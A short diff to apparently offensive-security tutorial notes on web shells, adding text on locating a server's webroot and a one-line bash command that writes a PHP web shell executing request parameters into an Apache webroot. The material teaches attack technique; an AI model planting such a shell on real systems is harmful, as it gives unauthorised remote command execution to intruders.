@@ -210,4 +210,10 @@ However, if we only have RCE through an exploit, we can write our shell directly
 | `Nginx`    | /usr/local/nginx/html/ |
 | `IIS`      | c:\inetpub\wwwroot\    |
 | `XAMPP`    | C:\xampp\htdocs\       |
-We can check these directories to see which webroot is in use and then use `e`
+We can check these directories to see which webroot is in use and then use `echo` to write our web shell. For example, if we were attacking a Linux host running Apache, we can write a `PHP` shell with the following command:
+
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
+
+#### Step 3: Accessing the Web Shell
